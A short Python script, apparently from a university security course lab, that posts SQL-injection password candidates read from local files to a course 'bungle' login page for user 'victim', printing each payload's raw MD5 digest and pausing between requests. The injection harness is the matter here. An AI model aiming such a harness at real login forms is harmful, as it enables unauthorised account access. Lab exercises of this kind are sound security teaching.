#!/usr/bin/env python3
"""
This makes a request to the server. Waits for a 60s timeout between post requests so we
aren't DDOSing the school. Automatically deletes entries which returned invalid submission/Bad SQL.
If theres a string you want saved, make a backup before running this script otherwise it might
be gone forever...
"""
import requests
import hashlib
import os
import time
url = "http://bungle-cs461.csl.illinois.edu/sqlinject2/checklogin.php"
files = [f for f in os.listdir('./data/') if os.path.isfile(os.path.join('./data/', f))]
data = [None]*len(files)
resp = [None]*len(files)
def make_request():
    for i in range(len(files)):
        f = open("data/"+files[i], "rb")
        payload = f.readline().decode('utf-8')
        data[i] = {"username":"victim", "password":payload}
        m = hashlib.md5((bytes(payload,encoding='utf-8')))
        print('File: %s'%(files[i]))
        print("Trying: %s"%(data[i]))
        print("Hash: ",end='')
        print(m.digest())
        ans = input("Do you want to send?[y/N]: ")
        if ans == 'y':
            resp[i] = requests.post(url, data[i])
        elif ans == 'N' or ans == 'n':
            #os.system('rm data/'+files[i])
            continue
        print("Got: ",end='')
        print(resp[i].text)
        if "Error" in resp[i].text or "Incorrect" in resp[i].text:
            #os.system('rm data/'+files[i])
            pass
        # Wait for a minute so as not to spam the server
        time.sleep(60)
